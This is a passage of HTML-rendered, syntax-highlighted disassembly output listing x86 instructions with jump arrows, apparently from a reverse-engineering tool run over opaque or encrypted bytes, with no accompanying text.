&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000009&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;1980&lt;/span&gt;&lt;span class="n"&gt;b6425fd4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sbb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;eax - 0x2ba0bd4a&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000000f&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ff1e&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;lcall&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;unk&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000011&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000012&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;83&lt;/span&gt;&lt;span class="n"&gt;a1c4d724f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ecx - 0xadb283c&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x46&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000019&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;xchg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000001a&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;aac25715f8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lcall&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x648e&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mh"&gt;0x5f7125ac&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x0000648e&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;==&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x00000021&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;e252&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x75&lt;/span&gt;&lt;span class="w"&gt;                        &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000023&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000024&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;894711&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edi + 0x11&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0x11:4&lt;/span&gt;&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="mh"&gt;0xc4a1835c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000027&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;sahf&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000028&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c4ad929b6505&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;les&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebp + 0x5659b92&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000002e&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="k"&gt;dec&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;===&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x0000002f&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;e2ff&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x30&lt;/span&gt;&lt;span class="w"&gt;                        &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000031&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;inc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000032&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="k"&gt;add&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000034&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;d438&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;aam&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x38&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000036&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;daa&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000037&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;c4b&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;cmp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x4b&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;K&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000039&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;d760d&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi + 0xd&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0xd:4&lt;/span&gt;&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="mh"&gt;0x1effd45f&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000003c&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;inc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000003d&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;insd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;es&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000003e&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c883290e&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x2983&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xe&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000042&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;80141&lt;/span&gt;&lt;span class="n"&gt;ce7&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;adc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esp + ebx&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x19&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000046&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;88&lt;/span&gt;&lt;span class="n"&gt;a2b6c7cd00&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx + 0xcdc7b6&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ah&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0xcdc7b6:1&lt;/span&gt;&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000004c&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;d8e9&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;fsubr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;st&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000004e&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;98&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;cwde&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000004f&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bde40ccb76&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x76cb0ce4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000054&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="k"&gt;dec&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000055&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000056&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mf"&gt;626e0&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;bound&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;qword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi + 0xe&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000059&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;e0c9&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;loopne&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x24&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000005b&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="n"&gt;b1c8&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x38&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x0000005e&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c24be4&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xe44b&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000061&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;ccb&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xffffffcb&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;====&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x00000063&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;764&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;jbe&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xb0&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
